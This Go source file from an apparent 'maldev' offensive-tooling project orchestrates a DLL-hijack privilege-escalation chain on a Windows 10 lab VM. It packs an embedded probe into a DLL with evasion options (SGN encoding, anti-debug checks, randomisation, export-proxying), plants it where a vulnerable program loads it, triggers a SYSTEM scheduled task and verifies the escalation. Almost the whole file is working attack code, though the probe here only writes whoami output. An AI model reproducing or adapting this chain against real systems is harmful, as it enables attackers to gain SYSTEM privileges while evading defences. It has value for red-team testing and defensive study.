// privesc-e2e is the orchestrator for the maldev DLL-hijack
// privilege-escalation E2E proof. It runs from a non-admin shell
// on the target Win10 host (typically `lowuser`) and executes the
// full attack chain end-to-end:
//
//  1. Read embedded probe.exe (built from cmd/privesc-e2e/probe/).
//  2. Pack probe.exe into a converted DLL via packer.PackBinary
//     with ConvertEXEtoDLL=true. The DLL's DllMain spawns the probe
//     payload on a fresh thread when LoadLibrary loads us.
//  3. Plant the packed DLL at C:\Vulnerable\hijackme.dll — the
//     vulnerable victim.exe (deployed by VM provisioning) calls
//     LoadLibraryW("hijackme.dll") with no path, so Windows search
//     order picks up our planted DLL first (application-directory
//     rule) before any system path.
//  4. Trigger the SYSTEM-context scheduled task that runs
//     victim.exe. Because the task is configured with a /Run ACL
//     for the lowuser account at provisioning time, the trigger
//     succeeds without admin rights.
//  5. Poll C:\ProgramData\maldev-marker\whoami.txt — the probe
//     writes its identity here. If the chain works, the file shows
//     "nt authority\system" (or whichever principal the task runs
//     as), proving privilege escalation from lowuser.
//
// Usage from lowuser shell on the VM:
//
//	privesc-e2e.exe                    # full chain, prints SUCCESS/FAIL
//	privesc-e2e.exe -task NameOfTask   # override task name
//	privesc-e2e.exe -no-trigger        # plant only, do not invoke task
//
// Build (from host):
//
//	go build -o privesc-e2e/probe/probe.exe ./cmd/privesc-e2e/probe
//	go build -o privesc-e2e.exe ./cmd/privesc-e2e
//
// (probe.exe must exist at build time for the embed to succeed.)
package main

// Build of the embedded artefacts requires a C toolchain (mingw) for
// the probe AND cgo for the Go-built fakelib. See README.md for the
// host build sequence; the driver script `scripts/vm-privesc-e2e.sh`
// invokes both in order before building the orchestrator.

import (
	_ "embed"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/oioio-space/maldev/pe/dllproxy"
	"github.com/oioio-space/maldev/pe/packer"
	"github.com/oioio-space/maldev/pe/parse"
)

//go:embed probe/probe.exe
var probeBytes []byte

//go:embed fakelib/fakelib.dll
var fakelibBytes []byte

const (
	defaultDLLPath    = `C:\Vulnerable\hijackme.dll`
	defaultMarkerPath = `C:\ProgramData\maldev-marker\whoami.txt`
	defaultTaskName   = `MaldevHijackVictim`
	pollTimeout       = 30 * time.Second
	pollInterval      = 500 * time.Millisecond
)

func main() {
	dllPath := flag.String("dll", defaultDLLPath, "where to plant the hijack DLL")
	markerPath := flag.String("marker", defaultMarkerPath, "where the probe will write whoami output")
	taskName := flag.String("task", defaultTaskName, "scheduled task to trigger (must be SYSTEM-context, lowuser-runnable)")
	noTrigger := flag.Bool("no-trigger", false, "plant the DLL but do not /Run the task — manual trigger expected")
	stage1Rounds := flag.Int("rounds", 3, "stage1 SGN rounds for the packer")
	mode := flag.Int("mode", 8, "packer mode: 8 (ConvertEXEtoDLL, minimal) or 10 (PackProxyDLL, fused with export table)")
	compress := flag.Bool("compress", true, "LZ4-compress the payload before encryption (smaller DLL, +50 B stub)")
	antiDebug := flag.Bool("antidebug", true, "AntiDebug PEB+RDTSC check at DllMain entry")
	randomize := flag.Bool("randomize", true, "Phase 2 randomisation suite (timestamps, section names, junk sections, ...)")
	flag.Parse()

	logStep("== maldev privesc-e2e orchestrator ==")
	logStep("running as: %s", currentUser())
	logStep("probe payload: %d bytes", len(probeBytes))
	logStep("pack mode: %d (compress=%v antidebug=%v randomize=%v)", *mode, *compress, *antiDebug, *randomize)

	packOpts := packer.PackBinaryOptions{
		Format:          packer.FormatWindowsExe,
		ConvertEXEtoDLL: true,
		Stage1Rounds:    *stage1Rounds,
		Seed:            time.Now().UnixNano(),
		Compress:        *compress,
		AntiDebug:       *antiDebug,
		RandomizeAll:    *randomize,
	}

	var packed []byte
	switch *mode {
	case 8:
		logStep("packing probe.exe → DLL via Mode 8 (ConvertEXEtoDLL)")
		out, _, err := packer.PackBinary(probeBytes, packOpts)
		if err != nil {
			fatal("PackBinary (Mode 8): %v", err)
		}
		packed = out
	case 10:
		logStep("Mode 10 path: drop embedded REAL Go DLL fakelib → parse exports → build proxy mirroring those")
		// (a) Write the embedded fakelib.dll to disk on the target.
		// fakelib is a real Go-compiled c-shared DLL with three named
		// exports (FakeInit/FakeStep/FakeFinal). Built into the
		// orchestrator at host build time; planted at runtime so an
		// operator running the orchestrator on a fresh box always has
		// a target DLL available without a separate provisioning step.
		fakelibPath := filepath.Join(filepath.Dir(*dllPath), "fakelib.dll")
		if err := os.WriteFile(fakelibPath, fakelibBytes, 0o644); err != nil {
			fatal("write fakelib at %s: %v", fakelibPath, err)
		}
		logStep("dropped fakelib.dll (%d bytes embedded → %s)", len(fakelibBytes), fakelibPath)

		// (b) Parse fakelib's exports — "live discovery". Reading
		// from disk (not from the embedded bytes) so the operator
		// could swap fakelib.dll for any other DLL between drops
		// and the next pack would adapt to that DLL's exports.
		fakelibOnDisk, err := os.ReadFile(fakelibPath)
		if err != nil {
			fatal("re-read fakelib: %v", err)
		}
		pf, err := parse.FromBytes(fakelibOnDisk, "fakelib.dll")
		if err != nil {
			fatal("parse fakelib: %v", err)
		}
		entries, err := pf.ExportEntries()
		if err != nil {
			fatal("parse fakelib exports: %v", err)
		}
		var exports []dllproxy.Export
		for _, e := range entries {
			if e.Name == "" {
				continue // skip ordinal-only
			}
			exports = append(exports, dllproxy.Export{Name: e.Name, Ordinal: e.Ordinal})
		}
		if len(exports) == 0 {
			fatal("fakelib has no named exports — Mode 10 needs ≥1")
		}
		logStep("parsed %d named exports from fakelib: %v", len(exports), exportNames(exports))

		// (c) Pack probe.exe + mirror fakelib's exports as forwarders.
		out, _, err := packer.PackProxyDLL(probeBytes, packer.ProxyDLLOptions{
			PackOpts:   packOpts,
			TargetName: "fakelib",
			Exports:    exports,
		})
		if err != nil {
			fatal("PackProxyDLL (Mode 10): %v", err)
		}
		packed = out
	default:
		fatal("unsupported -mode %d (want 8 or 10)", *mode)
	}
	logStep("packed DLL: %d bytes", len(packed))

	// 2. Plant
	if err := os.MkdirAll(filepath.Dir(*dllPath), 0o755); err != nil {
		fatal("mkdir %s: %v", filepath.Dir(*dllPath), err)
	}
	if err := os.WriteFile(*dllPath, packed, 0o644); err != nil {
		fatal("plant DLL at %s: %v", *dllPath, err)
	}
	logStep("planted DLL at %s", *dllPath)

	// 3. Wipe old marker so we can detect a fresh write
	_ = os.Remove(*markerPath)
	logStep("wiped old marker %s", *markerPath)

	// 4. Trigger
	if *noTrigger {
		logStep("--no-trigger set; expecting external trigger of task %q", *taskName)
	} else {
		logStep("triggering scheduled task %q", *taskName)
		out, err := exec.Command("schtasks", "/Run", "/TN", *taskName).CombinedOutput()
		if err != nil {
			fatal("schtasks /Run %s: %v\noutput: %s", *taskName, err, out)
		}
		logStep("schtasks output: %s", strings.TrimSpace(string(out)))
	}

	// 5. Poll marker
	logStep("polling %s for up to %s", *markerPath, pollTimeout)
	deadline := time.Now().Add(pollTimeout)
	var content []byte
	for time.Now().Before(deadline) {
		b, err := os.ReadFile(*markerPath)
		if err == nil && len(b) > 0 {
			content = b
			break
		}
		time.Sleep(pollInterval)
	}
	if content == nil {
		fatal("FAIL: marker %s not written within %s — chain broke somewhere (Defender? task ACL? DLL arch? planting path?)", *markerPath, pollTimeout)
	}

	got := strings.TrimSpace(string(content))
	logStep("marker contents: %s", got)

	// 6. Verify identity is NOT lowuser
	me := strings.ToLower(currentUser())
	gotID := strings.ToLower(strings.SplitN(got, "|", 2)[0])
	switch {
	case strings.Contains(gotID, "system"):
		logStep("✅ SUCCESS: payload ran as SYSTEM (got %q, we are %q)", gotID, me)
		os.Exit(0)
	case gotID != me:
		logStep("✅ PARTIAL SUCCESS: payload ran as %q (different from us %q) — privesc happened but not to SYSTEM", gotID, me)
		os.Exit(0)
	default:
		fatal("FAIL: payload ran as the SAME user (%q) — no privilege escalation occurred", gotID)
	}
}

func exportNames(es []dllproxy.Export) []string {
	out := make([]string, 0, len(es))
	for _, e := range es {
		out = append(out, e.Name)
	}
	return out
}

func currentUser() string {
	out, err := exec.Command("whoami").Output()
	if err != nil {
		return "<unknown>"
	}
	return strings.TrimSpace(string(out))
}

func logStep(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "[%s] %s\n",
		time.Now().Format("15:04:05"), fmt.Sprintf(format, args...))
}

func fatal(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "[%s] FATAL: %s\n",
		time.Now().Format("15:04:05"), fmt.Sprintf(format, args...))
	os.Exit(1)
}
